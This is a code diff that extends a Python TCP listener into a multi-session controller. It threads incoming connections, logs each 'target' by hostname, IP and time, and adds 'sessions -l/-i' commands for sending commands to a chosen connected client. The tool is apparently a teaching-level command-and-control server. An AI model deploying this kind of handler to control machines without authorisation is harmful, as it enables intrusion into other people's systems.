@@ -1,50 +1,66 @@
 import socket
 import sys
+import threading
+from prettytable import PrettyTable
+import time
+from datetime import datetime
 
 
-def listener_handler():
+def listener_handler(host_ip, host_port):
     sock.bind((host_ip, host_port))
     print('[+] Awaiting connection from client...')
     sock.listen()
-    remote_target, remote_ip = sock.accept()
-    comm_handler(remote_target, remote_ip)
+    t1 = threading.Thread(target=communication_handler)
+    t1.start()
 
-
-def comm_handler(remote_target, remote_ip):
-    print(f'[+] Connection received from {remote_ip[0]}')
+def target_comm_channel(target_id):
     while True:
-        try:
-            message = input('Message to send#> ')
-            if message == 'exit':
-                comm_out(remote_target, message)
-                remote_target.close()
-                break
-            comm_out(remote_target, message)
-            response = comm_in(remote_target)
+        message = input('send message#> ')
+        communication_out(target_id, message)
+        if message == 'exit':
+            target_id.send(message.encode())
+            target_id.close()
+            break
+        if message == 'background':
+            break
+        else:
+            response = communication_in(target_id)
             if response == 'exit':
                 print('[-] The client has terminated the session.')
-                remote_target.close()
+                target_id.close()
                 break
+
             print(response)
-        except KeyboardInterrupt:
-            print('[+] Keyboard interrupt issued.')
-            message = 'exit'
-            comm_out(remote_target, message)
-            remote_target.close()
+
+def communication_handler():
+    while True:
+        if kill_flag == 1:
             break
-        except Exception:
-            remote_target.close()
-            break
+        try:
+            remote_target, remote_ip = sock.accept()
+            current_time = time.strftime("%H:%M:%S", time.localtime())
+            date = datetime.now()
+            time_record = (f"{date.month}/{date.day}/{date.year} {current_time}")
+            host_name = socket.gethostbyaddr(remote_ip[0])
+            if host_name is not None:
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record])
+                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
+            else:
+                targets.append([remote_target, remote_ip[0], time_record])
+                print(f'\n[+] Connection recieved from {remote_ip[0]}\n' + 'Enter command#> ', end="")
+        except:
+            pass
 
 
-def comm_in(remote_target):
+def communication_in(target_id):
     print('[+] Awaiting response...')
-    response = remote_target.recv(1024).decode()
+    response = target_id.recv(1024).decode()
     return response
 
 
-def comm_out(remote_target, message):
-    remote_target.send(message.encode())
+def communication_out(target_id, message):
+    message = str(message)
+    target_id.send(message.encode())
 
 
 def banner():
@@ -65,12 +81,37 @@ def banner():
 
 if __name__ == '__main__':
     banner()
+    targets = []
+    kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         host_ip = sys.argv[1]
         host_port = int(sys.argv[2])
-        listener_handler()
     except IndexError:
         print('[-] Command line argument(s) missing.  Please try again.')
     except Exception as e:
         print(e)
+
+    listener_handler(host_ip, host_port)
+    while True:
+        try:
+            command = input('Enter command#> ')
+            if command.split(" ")[0] == 'sessions':
+                session_counter = 0
+                if command.split(" ")[1] == '-l':
+                    myTable = PrettyTable()
+                    myTable.field_names = ['Session', 'Target']
+                    myTable.padding_width = 3
+                    for target in targets:
+                        myTable.add_row([session_counter, target[1]])
+                        session_counter += 1
+                    print(myTable)
+                if command.split(" ")[1] == '-i':
+                    num = int(command.split(" ")[2])
+                    target_id = (targets[num])[0]
+                    target_comm_channel(target_id)
+        except KeyboardInterrupt:
+            print('\n[+] Keyboard interrupt issued.')
+            kill_flag = 1
+            sock.close()
+            break
